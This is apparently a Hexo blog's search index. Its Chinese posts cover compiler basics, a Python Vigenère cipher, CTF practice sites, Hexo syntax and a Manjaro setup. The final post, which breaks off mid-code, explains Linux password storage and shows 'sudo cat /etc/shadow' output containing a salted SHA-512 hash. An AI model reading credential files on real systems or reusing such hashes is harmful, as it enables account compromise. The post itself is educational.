<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>编译原理（一）</title>
      <link href="/2019/04/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2019/04/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="翻译程序"><a href="#翻译程序" class="headerlink" title="翻译程序"></a>翻译程序</h1><p>1.功能  </p><blockquote><p>源程序-&gt;翻译程序-&gt;目标程序（目标代码）  </p></blockquote><p>翻译程序有三种：编译程序、解释程序、汇编程序  </p><a id="more"></a><p>2.基本结构<br>源程序想要翻译成为目标程序需要下面基本五部分：  </p><blockquote><p>词法分析  </p><blockquote><p>对构成输入的源程序的字符串进行扫描和分解，识别出一个个单词和符号，如标识符、常数、界限符等。</p></blockquote></blockquote><blockquote><p>语法分析  </p><blockquote><p>在词法分析的基础上，根据语言的语法规则，把单词符号分解成各类语法单位（语法范畴），如短语、句子、程序段等。</p></blockquote></blockquote><blockquote><p>语义分析和中间代码生成  </p><blockquote><p>首先对各种语法范畴进行静态语义检查，如果正确则进行中间代码的翻译。该阶段遵循的是语言的语义规则，通常使用属性文法描述语义规则。中间代码的形式有四元式、三元式、逆波兰式和树形表示。</p></blockquote></blockquote><blockquote><p>代码优化  </p><blockquote><p>优化所遵循的是程序的等价变换原则。其方法有公共子表达式的提取、循环优化、删除无用代码等。</p></blockquote></blockquote><blockquote><p>目标代码生成  </p><blockquote><p>把中间代码（或经优化处理后）变换成特定机器上的低级语言代码。它有赖于硬件系统结构和机器指令的含义。</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 编译原理随记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>维吉尼亚密码的Python实现</title>
      <link href="/2019/04/01/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81%E7%9A%84Python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2019/04/01/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81%E7%9A%84Python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h1><p>代换密码体制的一般定义为M=C=K=Z26，其中M为明文空间、C为密文空间、K为密钥空间、Z26为26个整数(对应26个英文字母)组成的空间；要求26个字母与模26的剩余类集合{0,1,2,…,25}建立一一对应的关系。  </p><a id="more"></a><p>0x01 移位密码<br>移位密码的加密实际上就是将26个英文字母向后循环移动k位，其加密解密可表示为：<br>c=Ek(m)=m+k(mod 26)  </p><p>m=Dk(c)=c-k(mod 26)  </p><p>其中，m、c、k是满足0≤m,c,k≤25的整数。</p><h1 id="0x01-凯撒密码"><a href="#0x01-凯撒密码" class="headerlink" title="0x01 凯撒密码"></a>0x01 凯撒密码</h1><p>恺撒密码的替换方法是通过排列明文和密文字母表，密文字母表示通过将明文字母表向左或向右移动一个固定数目的位置。例如，当偏移量是左移3的时候（解密时的密钥就是3）：  </p><blockquote><p>明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ</p></blockquote><p>恺撒密码的加密、解密方法还能够通过同余的数学方法进行计算。首先将字母用数字代替，A=0，B=1，…，Z=25。此时偏移量为n的加密方法即为：</p><blockquote><p>E{n}(x)=(x+n)\mod 26} </p></blockquote><p>解密就是：  </p><blockquote><p>D{n}(x)=(x-n)\mod 26}</p></blockquote><h1 id="0x02-维吉尼亚密码"><a href="#0x02-维吉尼亚密码" class="headerlink" title="0x02 维吉尼亚密码"></a>0x02 维吉尼亚密码</h1><p>Vigenenre密码是最著名的多表代换密码，是16世纪法国著名密码学家Vigenenre发明的。Vigenenre密码使用一个词组作为密钥，密钥中每一个字母用来确定一个代换表，每一个密钥字母被用来加密一个明文字母，第一个密钥字母加密第一个明文字母，第二个密钥字母加密第二个明文字母，等所有密钥字母使用完后，密钥再次循环使用，于是加解密前需先将明密文按照密钥长度进行分组。密码算法可表示如下：</p><p>设密钥K=(k1,k2,…,kd)，明文M=(m1,m2,…,mn)，密文C=(c1,c2,…,cn)；</p><p>加密变换为：</p><blockquote><p>ci=Eki(mi)=mi+ki(mod 26)</p></blockquote><p>解密变换为： </p><blockquote><p>mi=Dki(ci)=ci-ki(mod 26)</p></blockquote><p>通常通过查询维吉尼亚表进行加解密。  </p><img src="/2019/04/01/维吉尼亚密码的Python实现/Vigenenre.png">  <p>0x04 以下为维吉尼亚密码的Python实现。  </p><figure class="highlight python"><figcaption><span>main.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:Hector</span></span><br><span class="line"><span class="comment"># datetime:20:13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#维吉尼亚</span></span><br><span class="line"><span class="keyword">import</span> VigenereDecrypto</span><br><span class="line"><span class="keyword">import</span> VigenereEncrypto</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    info = <span class="string">'''==========********=========='''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始加密</span></span><br><span class="line">    print(info, <span class="string">"\n------维吉尼亚加密算法------"</span>)</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取测试文本文档：傲慢与偏见第一卷第一节</span></span><br><span class="line">    message = open(<span class="string">"test.txt"</span>,<span class="string">"r+"</span>).read()</span><br><span class="line">    print(<span class="string">"读取测试文本文档:test.txt......"</span>)</span><br><span class="line">    print(<span class="string">"开始加密！"</span>)</span><br><span class="line">    <span class="comment"># 输入key</span></span><br><span class="line">    key = input(<span class="string">"请输入密钥："</span>)</span><br><span class="line">    <span class="comment"># 进入加密算法</span></span><br><span class="line">    CipherText = VigenereEncrypto.VigenereEncrypto(message, key)</span><br><span class="line">    <span class="comment"># 写入密文文本文档</span></span><br><span class="line">    C = open(<span class="string">"CipherText.txt"</span>, <span class="string">"w+"</span>)</span><br><span class="line">    C.write(CipherText)</span><br><span class="line">    C.close()</span><br><span class="line">    print(<span class="string">"加密后得到的密文是: \n"</span> + CipherText)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始解密</span></span><br><span class="line">    print(info, <span class="string">"\n------维吉尼亚解密算法------"</span>)</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取加密文本文档</span></span><br><span class="line">    print(<span class="string">"读取密文文本文档：CipherText.txt......"</span>)</span><br><span class="line">    Ciphertext = open(<span class="string">"CipherText.txt"</span>, <span class="string">"r+"</span>).read()</span><br><span class="line">    <span class="comment"># 进入解密算法</span></span><br><span class="line">    print(<span class="string">"开始解密！"</span>)</span><br><span class="line">    Plaintext = VigenereDecrypto.VigenereDecrypto(Ciphertext, key)</span><br><span class="line">    P = open(<span class="string">"PlainText.txt"</span>, <span class="string">"w+"</span>)</span><br><span class="line">    <span class="comment"># 写入解密文本文档</span></span><br><span class="line">    P.write(Plaintext)</span><br><span class="line">    P.close()</span><br><span class="line">    print(<span class="string">"解密后得到的明文是 : \n"</span> + Plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>  <figure class="highlight python"><figcaption><span>VigenereEncrypto.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:Hector</span></span><br><span class="line"><span class="comment"># datetime:20:14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereEncrypto</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    msLen = len(message)</span><br><span class="line">    keyLen = len(key)</span><br><span class="line">    message = message.upper()</span><br><span class="line">    key = key.upper()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文空间</span></span><br><span class="line">    raw = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义加密后的字符串</span></span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始加密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, msLen):</span><br><span class="line">        <span class="comment"># 轮询key的字符</span></span><br><span class="line">        j = i % keyLen</span><br><span class="line">        <span class="comment"># encode</span></span><br><span class="line">        <span class="comment"># 判断字符是否为英文字符，不是则直接向后面追加且继续</span></span><br><span class="line">        <span class="keyword">if</span> message[i] <span class="keyword">not</span> <span class="keyword">in</span> raw:</span><br><span class="line">            ciphertext += message[i]</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        encodechr = chr((ord(message[i]) - ord(<span class="string">"A"</span>) + ord(key[j]) - ord(<span class="string">"A"</span>)) % <span class="number">26</span> + ord(<span class="string">"A"</span>))</span><br><span class="line">        <span class="comment"># 追加字符</span></span><br><span class="line">        ciphertext += encodechr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回加密后的字符串</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    message = <span class="string">"Hello, World!"</span></span><br><span class="line">    key = <span class="string">"key"</span></span><br><span class="line">    text = VigenereEncrypto(message, key)</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>VigenereDecrypto.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:Hector</span></span><br><span class="line"><span class="comment"># datetime:20:14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereDecrypto</span><span class="params">(ciphertext, key)</span>:</span></span><br><span class="line">    msLen = len(ciphertext)</span><br><span class="line">    keyLen = len(key)</span><br><span class="line">    key = key.upper()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密文空间</span></span><br><span class="line">    raw = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始解密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, msLen):</span><br><span class="line">        <span class="comment"># 轮询key的字符</span></span><br><span class="line">        j = i % keyLen</span><br><span class="line">        <span class="comment"># encode</span></span><br><span class="line">        <span class="comment"># 判断字符是否为英文字符，不是则直接向后面追加且继续</span></span><br><span class="line">        <span class="keyword">if</span> ciphertext[i] <span class="keyword">not</span> <span class="keyword">in</span> raw:</span><br><span class="line">            plaintext += ciphertext[i]</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        decodechr = chr((ord(ciphertext[i]) - ord(<span class="string">"A"</span>) - ord(key[j]) - ord(<span class="string">"A"</span>)) % <span class="number">26</span> + ord(<span class="string">"A"</span>))</span><br><span class="line">        <span class="comment"># 追加字符</span></span><br><span class="line">        plaintext += decodechr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回加密后的字符串</span></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    ciphertext = <span class="string">"RIJVS, AMBPB!"</span></span><br><span class="line">    key = <span class="string">"key"</span></span><br><span class="line">    text = VigenereDecrypto(ciphertext, key)</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure><h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><p>测试使用的文本<br><img src="/2019/04/01/维吉尼亚密码的Python实现/03.png"> </p><p>加密后的明文：</p><img src="/2019/04/01/维吉尼亚密码的Python实现/01.png">  <p>解密后的密文</p><img src="/2019/04/01/维吉尼亚密码的Python实现/02.png">  <p>参考链接：<a href="https://www.cnblogs.com/maoguy/p/6002510.html" target="_blank" rel="noopener">维吉尼亚密码</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 现代密码学 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>各种CTF练手网站</title>
      <link href="/2019/04/01/%E5%90%84%E7%A7%8DCTF%E7%BB%83%E6%89%8B%E7%BD%91%E7%AB%99/"/>
      <url>/2019/04/01/%E5%90%84%E7%A7%8DCTF%E7%BB%83%E6%89%8B%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>咸鱼本人收集的各种CTF训练环境，可以用来练手,持续更新：</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ol><li><a href="http://pwnable.kr/" target="_blank" rel="noopener">pwnable</a></li></ol><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><ol><li><a href="https://www.hackthissite.org/" target="_blank" rel="noopener">hackthissite</a></li><li><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">RedTiger’s Hackit</a></li><li><a href="http://prompt.ml/" target="_blank" rel="noopener">promt</a></li></ol><h1 id="WarGame"><a href="#WarGame" class="headerlink" title="WarGame"></a>WarGame</h1><ol><li><a href="http://smashthestack.org/" target="_blank" rel="noopener">smashthestack</a></li><li><a href="http://overthewire.org/" title=" learn and practice security concepts" target="_blank" rel="noopener">overthewire</a></li></ol><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><a href="https://exploit-exercises.com/" title="learn about a variety of computer security issues" target="_blank" rel="noopener">exploit-exercises</a></li><li><a href="http://www.wechall.net/" title="Cryptographic, Crackit, Steganography, Programming, Logic and Math/Science" target="_blank" rel="noopener">wechall</a></li><li><a href="https://hackme.inndy.tw/" title="This is a platform for CTF beginner! Enjoy your CTF :)" target="_blank" rel="noopener">hackme</a></li><li><a href="http://captf.com/practice-ctf/" title="一个CTF List" target="_blank" rel="noopener">CTF List</a></li></ol><h1 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a>Crackme</h1><ol><li><a href="https://challenges.re/" title="these are rather just exercises" target="_blank" rel="noopener">challenges</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF训练环境 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo写作语法</title>
      <link href="/2019/04/01/hexo%E5%86%99%E4%BD%9C%E8%AF%AD%E6%B3%95/"/>
      <url>/2019/04/01/hexo%E5%86%99%E4%BD%9C%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h1><p>创建新文章：<br><code>$ hexo new [layout] &lt;title&gt;</code></p><h1 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h1><p>Hexo 默认以标题做为文件名称，但可编辑 <code>new_post_name</code> 参数来改变默认的文件名称。  </p><a id="more"></a><h1 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h1><p>创建草稿：<br><code>$ hexo new draft [layout] &lt;tittle&gt;</code><br>使用publish命令将草稿移动到<code>source/_post</code>文件夹。<br><code>$ hexo publish [layout] &lt;title&gt;</code>  </p><h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><p>在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件。<br><code>$ hexo new photo &quot;xxx&quot;</code>  </p><h1 id="引用块"><a href="#引用块" class="headerlink" title="引用块"></a>引用块</h1><p>在文章中插入引言，可包含作者、来源和标题。  </p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_08-48-53.png" title="quote">  <h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><p>在文章中插入代码。  </p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_08-52-22.png" title="code"><p>另一种形式的代码块是使用三个反引号来包裹。 </p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_08-57-57.png"><h1 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h1><p>在文章中插入指定大小的图片。<br><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-10-35.png" title="image"></p><h1 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h1><p>在文章中插入链接，并自动给外部链接添加 <code>target=&quot;_blank&quot;</code> 属性。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-12-45.png" title="link"><h1 id="包含代码文件"><a href="#包含代码文件" class="headerlink" title="包含代码文件"></a>包含代码文件</h1><p>插入 <code>source</code> 文件夹内的代码文件。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-14-39.png" title="include_code"><h1 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h1><p>在文章中插入YouTube视频。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-15-58.png" title="youtube"><p>在文章中插入Vimeo视频。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-20-28.png" title="Vimeo"><h1 id="引用文章"><a href="#引用文章" class="headerlink" title="引用文章"></a>引用文章</h1><p>引用其他文章的链接。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-21-27.png"><h1 id="引用资源"><a href="#引用资源" class="headerlink" title="引用资源"></a>引用资源</h1><p>引用文章的资源。</p><img src="/2019/04/01/hexo写作语法/Snipaste_2018-09-01_09-21-32.png">]]></content>
      
      
      
        <tags>
            
            <tag> 编程随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>manjaro安装及配置</title>
      <link href="/2019/03/17/manjaro/"/>
      <url>/2019/03/17/manjaro/</url>
      
        <content type="html"><![CDATA[<h1 id="一、启动盘准备"><a href="#一、启动盘准备" class="headerlink" title="一、启动盘准备"></a>一、启动盘准备</h1><p>我使用的是manjaro-KDE-STABLE版本<a href="https://osdn.net/dl/manjaro/manjaro-kde-18.0.4-stable-x86_64.iso" target="_blank" rel="noopener">下载链接</a> ，也可以选择XFCE或者GNOME版本,我选择这个仅仅是因为这个版本界面好看。<br>下载完毕之后使用imageusb<a href="https://dw.uptodown.com/dwn/RjLGfwlqXE8U-QGjvr3tuCLW7n31xlh3N6QBN6bmm5_MYpcFu214_aP5Xuj-o3mb7ByzaO4dkdJLBIXSWmFn52kQNJGr1cMtW25m7VEsqeG7TM410xd9EICYsvIdlXDZ/BcX0sW7dcH97VeUtCnDc41Na1Agvf98neNxXEaqAQWkOn0wqCaPpjNBSLCrqVPdXoyZXgmyil8QLnWpPkPvNxn9U7ijYZtmJFOdk7DwJ5t-9q13YaLyofZaTXA71up6_/elLjxQFcDqlmZTwl_2c1qrFaAwl4UrEZagZBfWrJ1MnraOvrzr12oJMobZVfNhYXJ6g4uXB4dPGyGwQZDXDa9Q==/" target="_blank" rel="noopener">下载链接</a> 写入u盘中，然后重启进入BIOS，选择从U盘启动，我的因为是三个硬盘，一个机械硬盘用作资料存储，一个M.2SSD已安装Windows10，一个SATA接口的空的固态硬盘，所以安装到SATA接口SSD上。   </p><h1 id="二、开始安装"><a href="#二、开始安装" class="headerlink" title="二、开始安装"></a>二、开始安装</h1><p>进入安装初始界面，选择时区为Asia/Shanghai，语言选择zh_cn，驱动boot选择free，然后此选项上按e，进入编辑，把free更改为intel，这样做是为了避免双显卡的冲突问题，然后按crtl+x保存退出，移到下一项，同样按e进入编辑模式，然后把free更改为intel，按住ctrl+x保存，开始进入图形化安装界面。  </p><a id="more"></a><h1 id="三、分区"><a href="#三、分区" class="headerlink" title="三、分区"></a>三、分区</h1><p>因为我的电脑已经安装了windows，所以需要考虑boot启动的挂在问题。在创建分区的时候，可以按照自己的想法随意分区，对于双系统需要将boot/efi挂载到windows的启动分区中，这样以后就可以随意进行双系统的切换了。   </p><h1 id="四、安装后的配置"><a href="#四、安装后的配置" class="headerlink" title="四、安装后的配置"></a>四、安装后的配置</h1><p>安装完毕后，拔掉u盘，进入BIOS，设置启动项为M.2 SSD，然后记得更高UEFI启动项manjaro为第一启动项，重启后即可进入桌面。登录后首先修改显卡硬件配置，不然等会儿重启后无法开机。我先安装了vim。</p><pre><code>sudo pacman -S vim</code></pre><p>然后修改grub</p><pre><code>sudo vim /etc/default/grub</code></pre><p>在quite后面添加</p><pre><code>acpi_osi=! acpi_osi=&apos;Windows 2009&apos;</code></pre><p>这样做是在告诉ACPI模块，我是windows7,别闹了，赶紧工作。<br>接着更新grub</p><pre><code>sudo update-grub    </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 开发环境配置 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux/Unix OS中password加密及解密方法探究</title>
      <link href="/2018/11/04/Linux-Unix-OS%E4%B8%ADpassword%E5%8A%A0%E5%AF%86%E5%8F%8A%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/"/>
      <url>/2018/11/04/Linux-Unix-OS%E4%B8%ADpassword%E5%8A%A0%E5%AF%86%E5%8F%8A%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux账户密码策略"><a href="#Linux账户密码策略" class="headerlink" title="Linux账户密码策略"></a>Linux账户密码策略</h1><p>在现在的linux和unix系统中，用户的密码都保存在shadow文件中，因为密码关系到系统的安全，所以只有root用户才有读shadow文件的权限。<br>/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">zongbao:x:1000:1000:fengzongbao,,,:/home/zongbao:/bin/zsh</span><br></pre></td></tr></table></figure><a id="more"></a><p>shadow中存放的内容是有着一定的格式的，如下：</p><blockquote><p>{username}:{passwd}:{last}:{may}:{must}:{warn}:{expire}:{diasble}:{reserved}</p></blockquote><p>/etc/shadow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo cat /etc/shadow </span><br><span class="line">root:!:16398:0:99999:7:::</span><br><span class="line">daemon:*:16273:0:99999:7:::</span><br><span class="line">bin:*:16273:0:99999:7:::</span><br><span class="line">sys:*:16273:0:99999:7:::</span><br><span class="line">sync:*:16273:0:99999:7:::</span><br><span class="line">zongbao:$6$NOOoCLdzq4JKnxF.$Cdz0/CbZQRjVJ1vfxMJBlloK1wVEa/czY/63WLBqKWFGjtHk2TPfhveu.ErfDF1gV2YahACNQ/UgEwVOT4qkC/:16569:0:99999:7:::</span><br></pre></td></tr></table></figure></p><p>用冒号分割后的具体意义如下：</p><ul><li>username：用户名</li><li>passwd：密码hash</li><li>last：密码修改距离1970年1月1日的时间</li><li>may：密码将被允许修改之前的天数（0 表示“可在任何时间修改”）</li><li>must : 系统将强制用户修改为新密码之前的天数（1 表示“永远都不能修改”）</li><li>warn : 密码过期之前，用户将被警告过期的天数（-1 表示“没有警告”）</li><li>expire : 密码过期之后，系统自动禁用帐户的天数（-1 表示“永远不会禁用”）</li><li>disable : 该帐户被禁用的天数（-1 表示“该帐户被启用”）</li><li>reserved : 保留供将来使用</li></ul><p>其中，密码hash列，用$符号隔开了几个部分，依次表示：</p><ul><li>$ 对应的加密算法</li><li>$ salt value</li><li>$ encrypt value</li></ul><blockquote><p>如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码，通过passwd -d 用户名 可以清空一个用户的口令。</p></blockquote><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p>数字和所使用的加密算法对应关系：<br>1： MD5 ，（22位）<br>2a: Blowfish, 只在有一部分linux分支中使用的加密方法<br>5: SHA-256 （43位）<br>6: SHA-512 （86位）<br>目前常用的是当id为1时，使用md5加密，id为5，采用SHA256进行加密，id为6采用SHA512进行加密。</p><p>参考linux标准的passwd.c源文件，在pw_encrypt函数中可以找到加密方法：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pw_encrypt</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *clear, <span class="keyword">const</span> <span class="keyword">char</span> *salt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> cipher[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">char</span> *cp;</span><br><span class="line"></span><br><span class="line">    cp = crypt (clear, salt);</span><br><span class="line">    <span class="keyword">if</span> (!cp) </span><br><span class="line">&#123;</span><br><span class="line">       perror (<span class="string">"crypt"</span>);</span><br><span class="line">       <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (salt &amp;&amp; salt[<span class="number">0</span>] == <span class="string">'$'</span> &amp;&amp; <span class="built_in">strlen</span> (cp) &lt;= <span class="number">13</span>)</span><br><span class="line">    &#123;</span><br><span class="line">..........</span><br><span class="line">     <span 